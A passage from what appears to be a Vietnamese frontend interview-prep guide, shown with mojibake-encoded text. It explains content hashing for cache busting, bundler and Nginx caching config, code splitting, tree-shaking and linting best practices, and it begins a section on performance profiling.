 * âœ… Cache Busting: Báº¯t buá»™c browser táº£i file má»›i khi code thay Ä‘á»•i
 * âœ… Long-term Caching: Cache files khÃ´ng Ä‘á»•i vÃ´ thá»i háº¡n (1 nÄƒm)
 * âœ… Performance: Giáº£m requests cho files khÃ´ng Ä‘á»•i
 */

// ===================================================
// ğŸ”¥ Váº¤N Äá»€: KHÃ”NG DÃ™NG HASH (The Problem)
// ===================================================

// Build #1 (Version 1.0 - Thá»© 2)
// dist/
//   â”œâ”€â”€ main.js        (100 KB) â† TÃªn file KHÃ”NG Äá»”I
//   â””â”€â”€ vendor.js      (300 KB) â† TÃªn file KHÃ”NG Äá»”I

// index.html
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.js"></script>     â† Browser cache file nÃ y
  <script src="/vendor.js"></script>   â† Browser cache file nÃ y
</head>
</html>
*/

// ğŸš¨ SCENARIO:
// 1. User A visit website â†’ Download main.js, vendor.js
// 2. Browser cache vá»›i header: Cache-Control: max-age=31536000 (1 nÄƒm)
// 3. Developer deploy version má»›i (Thá»© 3)
//    â†’ main.js code má»›i (fix bug)
//    â†’ NhÆ°ng TÃŠN FILE VáºªN LÃ€ main.js âŒ

// Build #2 (Version 1.1 - Thá»© 3 - FIX BUG)
// dist/
//   â”œâ”€â”€ main.js        (105 KB) â† Ná»™i dung Má»šI, tÃªn file CÅ¨ âŒ
//   â””â”€â”€ vendor.js      (300 KB) â† KhÃ´ng Ä‘á»•i

// 4. User A quay láº¡i website
//    â†’ Browser dÃ¹ng main.js tá»« CACHE (version cÅ©) âŒ
//    â†’ User KHÃ”NG tháº¥y bug fix! ğŸ˜±
//    â†’ Pháº£i Ctrl+F5 (hard refresh) Ä‘á»ƒ táº£i file má»›i

// âŒ Váº¤N Äá»€:
// - User tháº¥y version cÅ© (cÃ³ bug)
// - Pháº£i hard refresh manually
// - KhÃ´ng kiá»ƒm soÃ¡t Ä‘Æ°á»£c cache

// ===================================================
// âœ… GIáº¢I PHÃP: CONTENT HASHING
// ===================================================

// Build #1 (Version 1.0 - Thá»© 2)
// dist/
//   â”œâ”€â”€ main.a3f8b2c1.js     (100 KB) â† Hash tá»« Ná»˜I DUNG
//   â””â”€â”€ vendor.9d4e7f1a.js   (300 KB) â† Hash tá»« Ná»˜I DUNG

// index.html (auto-generated)
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.a3f8b2c1.js"></script>     â† TÃªn file cÃ³ hash
  <script src="/vendor.9d4e7f1a.js"></script>   â† TÃªn file cÃ³ hash
</head>
</html>
*/

// Browser cache:
// - main.a3f8b2c1.js: cached 1 nÄƒm âœ…
// - vendor.9d4e7f1a.js: cached 1 nÄƒm âœ…

// Build #2 (Version 1.1 - Thá»© 3 - FIX BUG)
// dist/
//   â”œâ”€â”€ main.f7c5d3a9.js     (105 KB) â† HASH Má»šI vÃ¬ ná»™i dung Ä‘á»•i! âœ…
//   â””â”€â”€ vendor.9d4e7f1a.js   (300 KB) â† HASH CÅ¨ vÃ¬ ná»™i dung KHÃ”NG Ä‘á»•i âœ…

// index.html (auto-generated)
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.f7c5d3a9.js"></script>     â† TÃªn file Má»šI! âœ…
  <script src="/vendor.9d4e7f1a.js"></script>   â† TÃªn file CÅ¨ (from cache) âœ…
</head>
</html>
*/

// User A quay láº¡i website:
// 1. Browser fetch index.html (luÃ´n fresh, khÃ´ng cache)
// 2. Browser tháº¥y main.f7c5d3a9.js (tÃªn Má»šI!)
//    â†’ Táº£i file má»›i (vÃ¬ chÆ°a cÃ³ trong cache) âœ…
// 3. Browser tháº¥y vendor.9d4e7f1a.js (tÃªn CÅ¨)
//    â†’ DÃ¹ng tá»« cache (tiáº¿t kiá»‡m 300 KB bandwidth) âœ…

// âœ… Lá»¢I ÃCH:
// - User LUÃ”N tháº¥y version má»›i (tá»± Ä‘á»™ng)
// - KhÃ´ng cáº§n hard refresh
// - Cache files khÃ´ng Ä‘á»•i vÃ´ thá»i háº¡n (vendor.js)
// - Chá»‰ download files Ä‘Ã£ thay Ä‘á»•i (main.js)

// ===================================================
// ğŸ”§ CÃCH HOáº T Äá»˜NG Cá»¦A CONTENT HASHING
// ===================================================

/**
 * QUY TRÃŒNH Táº O HASH:
 * 
 * 1. Bundler Ä‘á»c Ná»˜I DUNG file (main.js)
 * 2. Cháº¡y hashing algorithm (MD5, SHA-256, etc.) trÃªn ná»™i dung
 * 3. Táº¡o hash string (VD: a3f8b2c1d5e9f7a2)
 * 4. Láº¥y 8 kÃ½ tá»± Ä‘áº§u (a3f8b2c1) Ä‘á»ƒ tÃªn file ngáº¯n gá»n
 * 5. Rename file: main.js â†’ main.a3f8b2c1.js
 * 6. Update index.html vá»›i tÃªn file má»›i
 */

// VÃ­ dá»¥ minh há»a:
const crypto = require('crypto');
const fs = require('fs');

// Äá»c ná»™i dung file
const fileContent = fs.readFileSync('dist/main.js', 'utf-8');

// Táº¡o hash tá»« ná»™i dung (MD5)
const hash = crypto
  .createHash('md5')              // DÃ¹ng MD5 algorithm
  .update(fileContent)            // Hash ná»™i dung file
  .digest('hex')                  // Convert sang hex string
  .substring(0, 8);               // Láº¥y 8 kÃ½ tá»± Ä‘áº§u

console.log(hash); // "a3f8b2c1"

// Rename file
const newFileName = `main.${hash}.js`; // "main.a3f8b2c1.js"

// ===================================================
// ğŸ“Š HASH STRATEGIES (CÃ¡c Chiáº¿n LÆ°á»£c Hash)
// ===================================================

/**
 * 1ï¸âƒ£ [contenthash] - RECOMMENDED (KhuyÃªn dÃ¹ng)
 *    Hash dá»±a trÃªn Ná»˜I DUNG file
 *    â†’ File khÃ´ng Ä‘á»•i â†’ hash khÃ´ng Ä‘á»•i â†’ cache hiá»‡u quáº£
 * 
 * 2ï¸âƒ£ [chunkhash]
 *    Hash dá»±a trÃªn CHUNK (group of modules)
 *    â†’ Modules trong cÃ¹ng chunk share hash
 * 
 * 3ï¸âƒ£ [hash] (fullhash)
 *    Hash dá»±a trÃªn TOÃ€N Bá»˜ build
 *    â†’ Build má»›i â†’ Táº¤T Cáº¢ files Ä‘á»•i hash (khÃ´ng tá»‘i Æ°u)
 */

// webpack.config.js (Webpack)
module.exports = {
  output: {
    path: path.resolve(__dirname, 'dist'),
    
    // âœ… RECOMMENDED: [contenthash] - hash theo ná»™i dung
    filename: '[name].[contenthash:8].js',
    //                â†‘            â†‘
    //             name chunk    8 kÃ½ tá»± hash
    
    // Output: main.a3f8b2c1.js, vendor.9d4e7f1a.js
    
    // Alternative strategies:
    // filename: '[name].[chunkhash:8].js',  // Hash theo chunk
    // filename: '[name].[fullhash:8].js',   // Hash toÃ n bá»™ build (khÃ´ng khuyÃªn)
  },
  
  optimization: {
    // âš ï¸ QUAN TRá»ŒNG: moduleIds: 'deterministic'
    // â†’ Äáº£m báº£o module IDs khÃ´ng Ä‘á»•i giá»¯a cÃ¡c builds
    // â†’ vendor.js hash KHÃ”NG Ä‘á»•i náº¿u code khÃ´ng Ä‘á»•i
    moduleIds: 'deterministic',
    
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendor',
          priority: 10
        }
      }
    }
  }
};

// vite.config.ts (Vite)
import { defineConfig } from 'vite';

export default defineConfig({
  build: {
    rollupOptions: {
      output: {
        // âœ… Vite tá»± Ä‘á»™ng dÃ¹ng content hash
        entryFileNames: '[name].[hash].js',      // Entry files
        chunkFileNames: '[name].[hash].js',      // Lazy chunks
        assetFileNames: '[name].[hash].[ext]',   // CSS, images, fonts
      }
    }
  }
});

// ===================================================
// ğŸ¯ REAL-WORLD SCENARIO (Ká»‹ch Báº£n Thá»±c Táº¿)
// ===================================================

/**
 * ğŸ¢ SCENARIO: E-commerce Website
 * 
 * BEFORE Content Hashing:
 * âŒ Deploy version má»›i â†’ Users váº«n tháº¥y version cÅ© (cached)
 * âŒ Pháº£i Ä‘á»£i cache expire (1 tuáº§n) hoáº·c user hard refresh
 * âŒ Bug fix khÃ´ng Ä‘áº¿n users ngay láº­p tá»©c
 * 
 * AFTER Content Hashing:
 * âœ… Deploy version má»›i â†’ Users Tá»° Äá»˜NG tháº¥y version má»›i
 * âœ… Vendor files (React, libraries) cached vÃ´ thá»i háº¡n
 * âœ… Chá»‰ download files Ä‘Ã£ thay Ä‘á»•i
 */

// Build Timeline Example:
/*
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         CONTENT HASHING TIMELINE                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                            â”‚
â”‚  ğŸ“… MONDAY (Build #1 - Initial Release)                   â”‚
â”‚  â”œâ”€â”€ dist/                                                â”‚
â”‚  â”‚   â”œâ”€â”€ index.html                                      â”‚
â”‚  â”‚   â”œâ”€â”€ main.a3f8b2c1.js        (50 KB - app code)     â”‚
â”‚  â”‚   â”œâ”€â”€ vendor.9d4e7f1a.js      (300 KB - React, etc.) â”‚
â”‚  â”‚   â””â”€â”€ styles.c4d9e2f3.css     (10 KB)                â”‚
â”‚  â”‚                                                        â”‚
â”‚  â””â”€â”€ User A visit:                                        â”‚
â”‚      âœ… Download all files (360 KB total)                â”‚
â”‚      âœ… Browser cache: 1 nÄƒm                              â”‚
â”‚                                                            â”‚
â”‚  ğŸ“… TUESDAY (Build #2 - Fix Bug in App Code)             â”‚
â”‚  â”œâ”€â”€ dist/                                                â”‚
â”‚  â”‚   â”œâ”€â”€ index.html                                      â”‚
â”‚  â”‚   â”œâ”€â”€ main.f7c5d3a9.js        (52 KB) â† HASH Má»šI âœ…  â”‚
â”‚  â”‚   â”œâ”€â”€ vendor.9d4e7f1a.js      (300 KB) â† CÅ¨ âœ…       â”‚
â”‚  â”‚   â””â”€â”€ styles.c4d9e2f3.css     (10 KB) â† CÅ¨ âœ…        â”‚
â”‚  â”‚                                                        â”‚
â”‚  â””â”€â”€ User A revisit:                                      â”‚
â”‚      âœ… Download: index.html + main.f7c5d3a9.js (52 KB) â”‚
â”‚      âœ… From cache: vendor.js + styles.css (310 KB)     â”‚
â”‚      ğŸ“Š Bandwidth saved: 86% (310/360)                   â”‚
â”‚                                                            â”‚
â”‚  ğŸ“… FRIDAY (Build #3 - Upgrade React 18.2 â†’ 18.3)        â”‚
â”‚  â”œâ”€â”€ dist/                                                â”‚
â”‚  â”‚   â”œâ”€â”€ index.html                                      â”‚
â”‚  â”‚   â”œâ”€â”€ main.f7c5d3a9.js        (52 KB) â† CÅ¨ âœ…        â”‚
â”‚  â”‚   â”œâ”€â”€ vendor.b8f1a4c7.js      (305 KB) â† HASH Má»šI âœ… â”‚
â”‚  â”‚   â””â”€â”€ styles.c4d9e2f3.css     (10 KB) â† CÅ¨ âœ…        â”‚
â”‚  â”‚                                                        â”‚
â”‚  â””â”€â”€ User A revisit:                                      â”‚
â”‚      âœ… Download: index.html + vendor.b8f1a4c7.js       â”‚
â”‚      âœ… From cache: main.js + styles.css                â”‚
â”‚      ğŸ“Š Smart caching: Chá»‰ táº£i files Ä‘á»•i!               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
*/

// ===================================================
// ğŸ” CACHE HEADERS vá»›i CONTENT HASH
// ===================================================

// Nginx configuration (production)
server {
  location / {
    root /var/www/html;
    
    # âš ï¸ index.html: KHÃ”NG cache (luÃ´n fresh)
    location = /index.html {
      add_header Cache-Control "no-cache, no-store, must-revalidate";
      add_header Pragma "no-cache";
      add_header Expires "0";
    }
    
    # âœ… Hashed files: Cache vÃ´ thá»i háº¡n (1 nÄƒm)
    location ~* \.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot)$ {
      # Náº¿u file cÃ³ hash trong tÃªn (VD: main.a3f8b2c1.js)
      if ($request_filename ~* "\.([a-f0-9]{8})\.(js|css)$") {
        add_header Cache-Control "public, max-age=31536000, immutable";
        # immutable = Browser KHÃ”NG revalidate (tiáº¿t kiá»‡m requests)
      }
    }
  }
}

// ===================================================
// ğŸ“¦ HTML INJECTION (Tá»± Äá»™ng Inject Hash Files)
// ===================================================

// HtmlWebpackPlugin (Webpack)
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  plugins: [
    new HtmlWebpackPlugin({
      template: './public/index.html', // Template HTML
      inject: 'body',                  // Inject scripts vÃ o <body>
      minify: true                     // Minify HTML
    })
  ]
};

// public/index.html (Template - KHÃ”NG cÃ³ hash)
/*
<!DOCTYPE html>
<html>
<head>
  <title>My App</title>
</head>
<body>
  <div id="root"></div>
  <!-- Scripts sáº½ Ä‘Æ°á»£c inject tá»± Ä‘á»™ng -->
</body>
</html>
*/

// dist/index.html (Generated - CÃ“ hash)
/*
<!DOCTYPE html>
<html>
<head>
  <title>My App</title>
  <link href="/styles.c4d9e2f3.css" rel="stylesheet"> â† Auto-injected
</head>
<body>
  <div id="root"></div>
  <script src="/vendor.9d4e7f1a.js"></script>  â† Auto-injected
  <script src="/main.a3f8b2c1.js"></script>    â† Auto-injected
</body>
</html>
*/

// ===================================================
// ğŸ¯ BEST PRACTICES (Thá»±c HÃ nh Tá»‘t Nháº¥t)
// ===================================================

/**
 * âœ… DO (NÃŠN):
 * 1. DÃ¹ng [contenthash] cho production builds
 * 2. Cache hashed files: max-age=31536000 (1 nÄƒm)
 * 3. KHÃ”NG cache index.html (luÃ´n fresh)
 * 4. DÃ¹ng moduleIds: 'deterministic' (Webpack)
 * 5. Split vendor code (React, libraries) ra riÃªng
 * 6. TÃªn file: [name].[contenthash:8].js (8 kÃ½ tá»± hash)
 * 
 * âŒ DON'T (KHÃ”NG NÃŠN):
 * 1. DÃ¹ng [hash] (fullhash) â†’ táº¥t cáº£ files Ä‘á»•i hash
 * 2. Cache index.html â†’ users khÃ´ng tháº¥y version má»›i
 * 3. KhÃ´ng split vendor â†’ download láº¡i React má»—i deploy
 * 4. Hash quÃ¡ dÃ i (>12 kÃ½ tá»±) â†’ tÃªn file dÃ i
 */

// ===================================================
// ğŸ“Š PERFORMANCE METRICS (Sá»‘ Liá»‡u Hiá»‡u Suáº¥t)
// ===================================================

/**
 * ğŸ¯ REAL APP EXAMPLE (á»¨ng dá»¥ng thá»±c táº¿):
 * 
 * WITHOUT Content Hashing:
 * â”œâ”€â”€ Build #1: Users download 1.2 MB
 * â”œâ”€â”€ Build #2 (1 tuáº§n sau): Users download 1.2 MB (láº¡i!) âŒ
 * â”œâ”€â”€ Build #3 (1 tuáº§n sau): Users download 1.2 MB (láº¡i!) âŒ
 * â””â”€â”€ Total: 3.6 MB trong 3 tuáº§n
 * 
 * WITH Content Hashing:
 * â”œâ”€â”€ Build #1: Users download 1.2 MB
 * â”‚   â”œâ”€â”€ main.js: 200 KB
 * â”‚   â”œâ”€â”€ vendor.js: 800 KB
 * â”‚   â””â”€â”€ styles.css: 200 KB
 * â”‚
 * â”œâ”€â”€ Build #2: Users download 220 KB âœ…
 * â”‚   â”œâ”€â”€ main.js: 220 KB (changed - hash má»›i)
 * â”‚   â”œâ”€â”€ vendor.js: from cache (khÃ´ng Ä‘á»•i)
 * â”‚   â””â”€â”€ styles.css: from cache (khÃ´ng Ä‘á»•i)
 * â”‚
 * â”œâ”€â”€ Build #3: Users download 150 KB âœ…
 * â”‚   â”œâ”€â”€ main.js: from cache (khÃ´ng Ä‘á»•i)
 * â”‚   â”œâ”€â”€ vendor.js: from cache (khÃ´ng Ä‘á»•i)
 * â”‚   â””â”€â”€ styles.css: 150 KB (changed - hash má»›i)
 * â”‚
 * â””â”€â”€ Total: 1.57 MB trong 3 tuáº§n
 * 
 * ğŸ“Š Bandwidth Saved: 2.03 MB (56% nhá» hÆ¡n!) ğŸš€
 * âš¡ Load Time: Nhanh hÆ¡n 3-5x (tá»« cache)
 */

// ===================================================
// ğŸ”¥ COMMON MISTAKES (Lá»—i ThÆ°á»ng Gáº·p)
// ===================================================

// âŒ MISTAKE 1: Cache index.html
// nginx.conf
location = /index.html {
  add_header Cache-Control "max-age=3600"; // âŒ SAI! Cache 1 giá»
}
// â†’ Users khÃ´ng tháº¥y deploy má»›i trong 1 giá»!

// âœ… FIX:
location = /index.html {
  add_header Cache-Control "no-cache"; // âœ… ÄÃšNG! LuÃ´n fresh
}

// âŒ MISTAKE 2: DÃ¹ng [hash] thay vÃ¬ [contenthash]
filename: '[name].[hash:8].js'; // âŒ Táº¥t cáº£ files Ä‘á»•i hash má»—i build
// â†’ vendor.js hash má»›i dÃ¹ code khÃ´ng Ä‘á»•i â†’ users táº£i láº¡i 800 KB âŒ

// âœ… FIX:
filename: '[name].[contenthash:8].js'; // âœ… Chá»‰ files Ä‘á»•i má»›i cÃ³ hash má»›i

// âŒ MISTAKE 3: KhÃ´ng split vendor code
// â†’ main.js chá»©a app + React (1 MB)
// â†’ Má»—i láº§n sá»­a app â†’ users táº£i láº¡i cáº£ React âŒ

// âœ… FIX: Split vendor
optimization: {
  splitChunks: {
    cacheGroups: {
      vendor: {
        test: /[\\/]node_modules[\\/]/,
        name: 'vendor'
      }
    }
  }
}

// ===================================================
// ğŸ’¡ SUMMARY (TÃ³m Táº¯t)
// ===================================================

/**
 * ğŸ” CONTENT HASHING:
 * 
 * âœ… LÃ€ GÃŒ?
 *    - ThÃªm hash vÃ o tÃªn file dá»±a trÃªn ná»™i dung
 *    - File thay Ä‘á»•i â†’ hash má»›i â†’ tÃªn file má»›i
 * 
 * âœ… HOáº T Äá»˜NG SAO?
 *    1. Bundler hash ná»™i dung file (MD5/SHA-256)
 *    2. Táº¡o string hash (a3f8b2c1)
 *    3. Rename: main.js â†’ main.a3f8b2c1.js
 *    4. Update index.html vá»›i tÃªn má»›i
 * 
 * âœ… DÃ™NG Äá»‚ LÃ€M GÃŒ?
 *    - Cache Busting: Users luÃ´n tháº¥y version má»›i
 *    - Long-term Caching: Cache files khÃ´ng Ä‘á»•i vÃ´ thá»i háº¡n
 *    - Performance: Chá»‰ download files Ä‘Ã£ thay Ä‘á»•i
 *    - Bandwidth Saving: Tiáº¿t kiá»‡m 50-80% bandwidth
 * 
 * âœ… KHI NÃ€O DÃ™NG?
 *    - LUÃ”N LUÃ”N dÃ¹ng cho production builds!
 *    - Káº¿t há»£p vá»›i vendor splitting
 *    - Káº¿t há»£p vá»›i aggressive caching (1 nÄƒm)
 * 
 * âœ… CÃ”NG Cá»¤:
 *    - Webpack: output.filename = '[name].[contenthash:8].js'
 *    - Vite: Tá»± Ä‘á»™ng enable
 *    - Rollup: rollup-plugin-hash
 */

// ============================================
// 6. Real-world Trading App Example
// ============================================

// ğŸ¯ Setup ESLint + Prettier + Tree-shaking + Code Splitting

// package.json
{
  "name": "trading-app",
  "sideEffects": [
    "*.css",
    "./src/polyfills.ts" // Polyfills cÃ³ side-effects
  ],
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "lint": "eslint . --ext .ts,.tsx",
    "format": "prettier --write \"src/**/*.{ts,tsx}\""
  }
}

// vite.config.ts (Vite = modern bundler)
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  build: {
    sourcemap: true, // âœ… Generate source maps

    rollupOptions: {
      output: {
        // ğŸ“¦ Manual chunks cho better caching
        manualChunks: {
          'vendor': ['react', 'react-dom'],
          'charts': ['recharts'], // Heavy chart library
          'utils': ['lodash-es', 'date-fns']
        }
      }
    }
  }
});

// ğŸ“‚ App structure vá»›i code splitting
// src/App.tsx
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

// âœ… Lazy load pages
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Trading = lazy(() => import('./pages/Trading'));
const Portfolio = lazy(() => import('./pages/Portfolio'));
const Analytics = lazy(() => import('./pages/Analytics')); // Heavy (charts)

export default function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/trading" element={<Trading />} />
        <Route path="/portfolio" element={<Portfolio />} />
        <Route path="/analytics" element={<Analytics />} /> {/* Load khi cáº§n */}
      </Routes>
    </Suspense>
  );
}

// src/utils/index.ts (Tree-shakable exports)
// âœ… GOOD: Named exports
export { calculateProfit } from './profit-calculator';
export { validateOrder } from './order-validator';
export { formatCurrency } from './formatters';

// KHÃ”NG dÃ¹ng: export * from './profit-calculator' (barrel export)

// src/pages/Analytics.tsx (Lazy load heavy components)
import { lazy, Suspense } from 'react';

// âœ… Lazy load chart component (recharts lib ~500KB)
const ProfitChart = lazy(() => import('../components/ProfitChart'));

export default function Analytics() {
  return (
    <div>
      <h1>Analytics</h1>

      <Suspense fallback={<div>Loading chart...</div>}>
        <ProfitChart /> {/* Load khi render page nÃ y */}
      </Suspense>
    </div>
  );
}

// ğŸ¯ Build results:
// âœ… main.js (50KB) - App shell + routing
// âœ… vendor.js (150KB) - React + ReactDOM (cache lÃ¢u)
// âœ… charts.js (500KB) - Recharts (load khi vÃ o /analytics)
// âœ… dashboard.chunk.js (30KB)
// âœ… trading.chunk.js (40KB)
// âœ… portfolio.chunk.js (35KB)
// âœ… analytics.chunk.js (20KB)

// ğŸ’¡ Lá»£i Ã­ch:
// - Initial load: 50KB + 150KB = 200KB (thay vÃ¬ 825KB)
// - User vÃ o /analytics â†’ Load thÃªm charts.js (500KB) khi cáº§n
// - Faster initial render, better UX
```

---

**Best Practices:**

1. **ESLint + Prettier**

   ```bash
   # Install
   npm install -D eslint prettier eslint-config-prettier
   npm install -D @typescript-eslint/parser @typescript-eslint/eslint-plugin

   # Run on pre-commit (husky + lint-staged)
   npx husky install
   npx husky add .husky/pre-commit "npx lint-staged"
   ```

   ```json
   // package.json
   {
     "lint-staged": {
       "*.{ts,tsx}": ["eslint --fix", "prettier --write"]
     }
   }
   ```

2. **Source Maps**

   - âœ… Development: `eval-source-map` (fast rebuild)
   - âœ… Production: `source-map` hoáº·c `hidden-source-map`
   - âœ… Deploy .map files riÃªng (khÃ´ng public) â†’ báº£o máº­t
   - âœ… Set `sourceMapFilename` Ä‘á»ƒ serve tá»« CDN riÃªng

3. **Tree-shaking**

   - âœ… DÃ¹ng ESM (`import/export`), KHÃ”NG dÃ¹ng CommonJS
   - âœ… Set `sideEffects: false` trong package.json
   - âœ… Named exports thay vÃ¬ default exports
   - âœ… Import trá»±c tiáº¿p, trÃ¡nh barrel exports (`index.ts`)
   - âœ… Check bundle size: `npm run build -- --analyze`

4. **Code Splitting**

   - âœ… Route-based splitting (React Router, Next.js pages)
   - âœ… Component-based splitting (lazy load heavy components)
   - âœ… Vendor splitting (separate React, libraries...)
   - âœ… Set `Suspense` fallback cho UX tá»‘t
   - âœ… Prefetch critical chunks: `<link rel="prefetch">`

5. **TypeScript Strict Mode**
   ```json
   // tsconfig.json
   {
     "compilerOptions": {
       "strict": true, // Enable táº¥t cáº£ strict checks
       "noUncheckedIndexedAccess": true, // Check array/object access
       "noImplicitReturns": true, // Function pháº£i return
       "noFallthroughCasesInSwitch": true // Switch case pháº£i break
     }
   }
   ```

---

**Common Mistakes:**

1. **âŒ ESLint + Prettier Conflict**

   ```typescript
   // âŒ BAD: ESLint format rules conflict vá»›i Prettier
   // .eslintrc.js (KHÃ”NG dÃ¹ng indent, quotes rules)
   {
     rules: {
       'indent': ['error', 2], // âŒ Conflict vá»›i Prettier
       'quotes': ['error', 'single'] // âŒ Conflict vá»›i Prettier
     }
   }

   // âœ… GOOD: DÃ¹ng eslint-config-prettier
   {
     extends: ['prettier'] // Táº¯t format rules
   }
   ```

2. **âŒ Source Maps trong Production**

   ```typescript
   // âŒ BAD: Public source maps â†’ leak source code
   // webpack.config.js
   {
     devtool: 'source-map', // .map files public
   }

   // âœ… GOOD: Hidden source maps hoáº·c serve riÃªng
   {
     devtool: 'hidden-source-map', // KhÃ´ng reference trong bundle
     output: {
       sourceMapFilename: '[file].map',
       publicPath: 'https://private-sourcemaps.example.com/'
     }
   }
   ```

3. **âŒ Tree-shaking KhÃ´ng Hoáº¡t Ä‘á»™ng**

   ```typescript
   // âŒ BAD: CommonJS â†’ tree-shaking KHÃ”NG work
   const utils = require('./utils'); // CommonJS

   // âŒ BAD: Default export + destructure
   export default { add, subtract, multiply };
   import utils from './utils';
   const { add } = utils; // Bundle chá»©a cáº£ subtract, multiply

   // âŒ BAD: Barrel exports vá»›i side-effects
   // index.ts
   export * from './moduleA'; // moduleA cÃ³ side-effects

   // âœ… GOOD: Named exports + ESM
   export function add(a, b) {
     return a + b;
   }
   import { add } from './utils'; // Chá»‰ bundle add()
   ```

4. **âŒ Code Splitting QuÃ¡ Nhiá»u**

   ```typescript
   // âŒ BAD: Split quÃ¡ nhá» â†’ nhiá»u HTTP requests
   const Button = lazy(() => import('./Button')); // âŒ Component nhá» khÃ´ng nÃªn split
   const Icon = lazy(() => import('./Icon')); // âŒ QuÃ¡ nhá»

   // âœ… GOOD: Chá»‰ split components/routes náº·ng
   const Dashboard = lazy(() => import('./pages/Dashboard')); // âœ… Page náº·ng
   const ChartLibrary = lazy(() => import('./ChartLibrary')); // âœ… Library náº·ng (500KB+)
   ```

5. **âŒ Path Alias PhÃ¡ Tree-shaking**

   ```typescript
   // tsconfig.json
   {
     "paths": {
       "@utils/*": ["./src/utils/*"]
     }
   }

   // âŒ BAD: Import tá»« barrel file
   import { add } from '@utils'; // â†’ import from index.ts (barrel)
   // Tree-shaking kÃ©m vÃ¬ pháº£i load toÃ n bá»™ index.ts

   // âœ… GOOD: Import trá»±c tiáº¿p
   import { add } from '@utils/math'; // â†’ import trá»±c tiáº¿p
   ```

6. **âŒ QuÃªn Set `sideEffects`**

   ```json
   // âŒ BAD: KhÃ´ng set sideEffects
   // package.json
   {} // Bundler assume Má»ŒI module cÃ³ side-effects

   // âœ… GOOD: Explicit declare
   {
     "sideEffects": false // Hoáº·c ["*.css", "polyfills.ts"]
   }
   ```

7. **âŒ Dynamic Import KhÃ´ng CÃ³ Error Handling**

   ```typescript
   // âŒ BAD: KhÃ´ng handle error
   const mod = await import('./module'); // Náº¿u fail â†’ crash app

   // âœ… GOOD: Handle error
   try {
     const mod = await import('./module');
     mod.doSomething();
   } catch (error) {
     console.error('Failed to load module:', error);
     // Fallback logic
   }
   ```

---
</details>


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“Š Q45: Performance Profiling (performance.mark, Long Tasks, DevTools)</span></summary>


**â“ CÃ¢u Há»i:**
LÃ m tháº¿ nÃ o Ä‘á»ƒ profile vÃ  debug performance issues trong web app? PhÃ¢n tÃ­ch cÃ¡c tools vÃ  techniques hiá»‡u quáº£ nháº¥t.



#### **ğŸ“Š Performance Profiling - Tá»•ng Quan**

Performance profiling lÃ  quÃ¡ trÃ¬nh **Ä‘o lÆ°á»ng, phÃ¢n tÃ­ch vÃ  tá»‘i Æ°u** hiá»‡u nÄƒng á»©ng dá»¥ng. NguyÃªn táº¯c vÃ ng:

> **"Measure first, optimize later. Never guess, always measure!"**
> (Äo trÆ°á»›c, tá»‘i Æ°u sau. KhÃ´ng bao giá» Ä‘oÃ¡n, luÃ´n Ä‘o!)

**ğŸ¯ Performance Profiling Workflow:**

```
1. MEASURE (Äo Ä‘áº¡c)
   â†“
2. ANALYZE (PhÃ¢n tÃ­ch bottlenecks)
   â†“
3. OPTIMIZE (Tá»‘i Æ°u)
   â†“
4. MEASURE AGAIN (Äo láº¡i Ä‘á»ƒ verify)
   â†“
5. REPEAT (Láº·p láº¡i cho Ä‘áº¿n khi Ä‘áº¡t target)
```

---

#### **1ï¸âƒ£ Performance API - User Timing API**

**ğŸ”¹ performance.mark() & performance.measure()**

API chuáº©n cá»§a browser Ä‘á»ƒ Ä‘o timing cÃ¡c operations.

```typescript
// =====================================
// PERFORMANCE.MARK & MEASURE
// =====================================

// ğŸ”¹ CÆ  Báº¢N - Äo má»™t operation Ä‘Æ¡n giáº£n
function measureOperation() {
  // Mark báº¯t Ä‘áº§u
  performance.mark('operation-start');
  
  // Code cáº§n Ä‘o
  expensiveCalculation();
  
  // Mark káº¿t thÃºc
  performance.mark('operation-end');
  
  // Measure khoáº£ng thá»i gian giá»¯a 2 marks
  performance.measure('operation-duration', 'operation-start', 'operation-end');
  
  // Láº¥y káº¿t quáº£
  const measure = performance.getEntriesByName('operation-duration')[0];
  console.log(`Operation took: ${measure.duration.toFixed(2)}ms`);
}

// ğŸ”¹ THá»°C Táº¾ - Äo API calls trong React app
async function fetchUserProfile(userId: string) {
  const markName = `fetch-user-${userId}`;
  
  performance.mark(`${markName}-start`);
  
  try {
    const response = await fetch(`/api/users/${userId}`);
    const data = await response.json();
    
    performance.mark(`${markName}-end`);
    performance.measure(markName, `${markName}-start`, `${markName}-end`);
    
    // Log performance
    const measure = performance.getEntriesByName(markName)[0];
    console.log(`âœ… Fetched user ${userId} in ${measure.duration.toFixed(2)}ms`);
    
    return data;
  } catch (error) {
